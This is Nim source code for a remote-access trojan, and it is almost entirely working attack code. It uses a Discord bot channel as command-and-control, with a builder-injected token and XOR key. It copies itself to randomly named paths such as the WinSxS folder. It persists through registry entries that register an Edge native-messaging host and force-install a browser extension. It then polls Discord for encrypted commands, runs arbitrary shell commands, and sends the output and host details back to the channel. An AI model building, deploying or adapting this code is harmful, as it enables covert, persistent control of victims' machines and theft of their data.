import std/[httpclient, json, os, osproc, strutils, base64, random, times]

# ============================================================================
# CONFIGURATION (BUILDER INJECTS THESE)
# ============================================================================
const
  BOT_TOKEN    = "{{DISCORD_TOKEN}}"
  CHANNEL_ID   = "{{DISCORD_CHANNEL}}"
  VODKA_HEX    = "{{VODKA_KEY}}"
  EXT_ID       = "{{EXTENSION_ID}}"
  AGENT_PATH   = "{{AGENT_PATH}}"
  REG_KEY      = "{{REGISTRY_KEY}}"
  RANDOMIZE    = {{RANDOMIZE_PATH}}

# ============================================================================
# XOR CRYPTO
# ============================================================================
var VODKA_KEY: array[32, byte]
for i in 0..<32:
  VODKA_KEY[i] = parseHexInt(VODKA_HEX[i*2 .. i*2+1]).byte

proc xorEncrypt(key: array[32, byte], data: string): string =
  var res = ""
  for i in 0..<data.len:
    res.add(chr(ord(data[i]) xor int(key[i mod 32])))
  encode(res)

proc xorDecrypt(key: array[32, byte], b64data: string): string =
  let data = decode(b64data)
  var res = ""
  for i in 0..<data.len:
    res.add(chr(ord(data[i]) xor int(key[i mod 32])))
  return res

# ============================================================================
# UTILITIES
# ============================================================================
proc randomString(len: int): string =
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  randomize()
  result = ""
  for _ in 1..len:
    result.add(chars[rand(chars.high)])

proc getDeployPath(): string =
  when defined(windows):
    let baseDirs = @[
      "C:\\Windows\\WinSxS",
      "C:\\ProgramData\\Microsoft\\Windows",
      getEnv("LOCALAPPDATA") & "\\Microsoft"
    ]
    let baseDir = baseDirs[rand(baseDirs.high)]
    let randName = randomString(8) & ".exe"
    return baseDir & "\\" & randName
  else:
    return getTempDir() / randomString(8)

# ============================================================================
# SELF-DEPLOYMENT (PEEL)
# ============================================================================
proc peel(): string =
  let origin = getAppFilename()
  let target = when RANDOMIZE: getDeployPath() else: AGENT_PATH
  try:
    copyFile(origin, target)
    return target
  except OSError as e:
    return origin

# ============================================================================
# PERSISTENCE
# ============================================================================
proc installPersistence(deployPath: string) =
  let regPath = r"HKCU\Software\Microsoft\Edge\NativeMessagingHosts\" & REG_KEY
  var p1 = startProcess(
    "reg.exe",
    args = @["add", regPath, "/ve", "/t", "REG_SZ", "/d", deployPath.parentDir & "\\host.json", "/f"],
    options = {poNoConsole, poUsePath}
  )
  p1.close()

  let extRegPath = r"HKCU\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
  var p2 = startProcess(
    "reg.exe",
    args = @["add", extRegPath, "/v", "1", "/t", "REG_SZ", "/d", EXT_ID & ";file:///" & deployPath.parentDir.replace("\\", "/") & "/extension.crx", "/f"],
    options = {poNoConsole, poUsePath}
  )
  p2.close()

# ============================================================================
# DISCORD COMMUNICATION
# ============================================================================
proc sendMessage(client: HttpClient, content: string) =
  let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages"
  client.headers = newHttpHeaders({
    "Authorization": "Bot " & BOT_TOKEN,
    "Content-Type": "application/json"
  })

  let encrypted = xorEncrypt(VODKA_KEY, content)
  const CHUNK_SIZE = 1800
  var chunks: seq[string]
  var i = 0
  while i < encrypted.len:
    let endIdx = min(i + CHUNK_SIZE, encrypted.len)
    chunks.add(encrypted[i ..< endIdx])
    i += CHUNK_SIZE

  for idx, chunk in chunks:
    let prefix = if chunks.len > 1: "[Part " & $(idx+1) & "/" & $chunks.len & "]\n" else: ""
    let body = %*{"content": "```\n" & prefix & chunk & "\n```"}
    try:
      discard client.postContent(url, $body)
      sleep(1000)
    except:
      discard

proc sendAck(client: HttpClient, msgID: string) =
  let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages/" & msgID & "/reactions/%E2%9C%85/@me"
  client.headers = newHttpHeaders({"Authorization": "Bot " & BOT_TOKEN})
  try:
    discard client.put(url)
  except:
    discard

proc sendHeartbeat(client: HttpClient) =
  let hostname = getEnv("COMPUTERNAME", "unknown")
  let msg = "[HEARTBEAT] " & hostname & " | " & $now()
  sendMessage(client, msg)

# ============================================================================
# COMMAND PROCESSING
# ============================================================================
proc processCommand(content: string): string =
  if content.startsWith("!exec "):
    let cmd = content[6..^1].strip()
    let (output, exitCode) = execCmdEx(cmd)
    return "[EXIT:" & $exitCode & "]\n" & output
  elif content.startsWith("!info"):
    return "Hostname: " & getEnv("COMPUTERNAME", "N/A") &
           "\nUser: " & getEnv("USERNAME", "N/A") &
           "\nOS: " & hostOS &
           "\nPID: " & $getCurrentProcessId()
  elif content.startsWith("!help"):
    return "!exec <cmd> - Execute command\n!info - System info\n!help - This message"
  else:
    return "[?] Unknown command"

# ============================================================================
# MAIN LOOP
# ============================================================================
proc pollCommands() =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"Authorization": "Bot " & BOT_TOKEN})

  var lastMsgID = ""
  var heartbeatTimer = epochTime()

  sendMessage(client, "[*] Agent online | " & getEnv("COMPUTERNAME", "unknown"))

  while true:
    try:
      if epochTime() - heartbeatTimer > 300:
        sendHeartbeat(client)
        heartbeatTimer = epochTime()

      let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages?limit=5"
      let response = client.getContent(url)
      let msgs = parseJson(response)

      for msg in msgs:
        let msgID = msg["id"].getStr()
        let content = msg["content"].getStr()

        if msgID == lastMsgID: break
        if content.startsWith("```"): continue

        if lastMsgID == "":
          lastMsgID = msgID
          break

        lastMsgID = msgID

        var decrypted = content
        try:
          decrypted = xorDecrypt(VODKA_KEY, content)
        except:
          decrypted = content

        if decrypted.startsWith("!"):
          sendAck(client, msgID)
          let result = processCommand(decrypted)
          sendMessage(client, result)

    except:
      sleep(10000)
      continue

    sleep(6000)

# ============================================================================
# ENTRY POINT
# ============================================================================
when isMainModule:
  let deployedPath = peel()
  installPersistence(deployedPath)
  pollCommands()
